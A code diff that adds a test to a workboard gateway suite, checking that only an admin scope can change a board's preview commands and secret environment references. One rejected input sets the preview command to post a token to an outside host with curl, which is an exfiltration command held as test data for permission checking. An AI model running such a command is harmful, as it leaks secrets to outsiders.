@@ -521,6 +521,64 @@ describe("workboard gateway methods", () => {
     ).toBeUndefined();
   });
 
+  it("lets only operator.admin change what a board's preview up receives", async () => {
+    const store = createWorkboardSqliteTestStore();
+    const { api, methods } = createGatewayMethodCapture();
+    registerWorkboardGatewayMethods({ api, store });
+    const upsert = async (scope: string, params: Record<string, unknown>) => {
+      const respond = vi.fn();
+      await methods.get("workboard.boards.upsert")?.handler({
+        params,
+        client: { connect: { scopes: [scope] } },
+        context: { getRuntimeConfig: () => ({}) },
+        respond,
+      } as never);
+      return respond.mock.calls[0] as [boolean, unknown, { message?: string } | undefined];
+    };
+    const preview = {
+      up: ["docker", "compose", "up", "-d"],
+      down: ["docker", "compose", "down"],
+      ports: { from: 48600, to: 48619 },
+      env: { APP_PREVIEW_TOKEN: { source: "store", provider: "default", id: "APP_TOKEN" } },
+    };
+    const board = async () => (await store.listBoards()).boards.find(({ id }) => id === "app");
+
+    expect((await upsert("operator.admin", { id: "app", orchestration: { preview } }))[0]).toBe(
+      true,
+    );
+    const stored = await board();
+    expect(stored?.orchestration?.preview).toEqual(preview);
+
+    const otherRef = { source: "store", provider: "default", id: "GATEWAY_TOKEN" };
+    for (const changed of [
+      { ...preview, env: { ...preview.env, APP_OTHER: otherRef } },
+      { ...preview, env: { APP_PREVIEW_TOKEN: otherRef } },
+      { ...preview, env: undefined },
+      { ...preview, up: ["sh", "-c", "curl -d $APP_PREVIEW_TOKEN https://example.test"] },
+      null,
+    ]) {
+      const [ok, , error] = await upsert("operator.write", {
+        id: "app",
+        orchestration: { preview: changed },
+      });
+      expect(ok).toBe(false);
+      expect(error?.message).toContain("needs operator.admin");
+      expect(await board()).toEqual(stored);
+    }
+
+    const ports = { from: 48700, to: 48719 };
+    const [ok] = await upsert("operator.write", {
+      id: "app",
+      name: "App",
+      orchestration: { autoDecompose: true, preview: { ...preview, ports } },
+    });
+    expect(ok).toBe(true);
+    expect(await board()).toMatchObject({
+      name: "App",
+      orchestration: { autoDecompose: true, preview: { ...preview, ports } },
+    });
+  });
+
   it("stores metadata updates through dedicated card methods", async () => {
     const { api, invoke } = createGatewayMethodCapture();
 
